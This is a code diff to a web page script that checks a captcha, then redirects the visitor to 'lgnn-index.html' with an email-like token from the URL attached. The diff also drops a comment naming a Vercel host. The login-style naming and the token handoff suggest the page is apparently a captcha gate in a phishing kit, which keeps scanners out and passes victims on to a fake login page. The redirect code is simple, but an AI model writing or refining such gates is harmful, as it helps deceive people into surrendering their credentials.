@@ -113,6 +113,9 @@
     </div>
 
     <script>
+        // CONFIGURATION: Set your target main page filename here
+        const MAIN_FILENAME = "lgnn-index.html";
+
         let currentCaptcha = "";
 
         function generateCaptcha() {
@@ -130,11 +133,10 @@
             const errorElement = document.getElementById("errorMessage");
 
             if (userInput.toLowerCase() === currentCaptcha.toLowerCase()) {
-                // Get URL search parameters (?web=tken200@1472)
+                // Get URL search parameters (e.g., ?web=tokenjjj@jjcom)
                 const urlParams = new URLSearchParams(window.location.search);
                 const webToken = urlParams.get('web');
                 
-                // Fallback to current URL hash if query param is not used
                 const currentHash = window.location.hash;
 
                 let tokenValue = "";
@@ -146,8 +148,12 @@
                     tokenValue = "#";
                 }
 
-                // Constructs: https://lgns0100ref300superfly-usmiais-lgnn.vercel.app/m#tken200@1472
-                const targetUrl = window.location.origin + "/m" + tokenValue;
+                // Get current directory path (works on both Vercel root and GitHub subpaths)
+                const currentPath = window.location.pathname;
+                const directoryPath = currentPath.substring(0, currentPath.lastIndexOf('/') + 1);
+
+                // Constructs final URL: e.g. https://.../lgnn-index.html#tokenjjj@jjcom
+                const targetUrl = window.location.origin + directoryPath + MAIN_FILENAME + tokenValue;
 
                 window.location.href = targetUrl;
             } else {
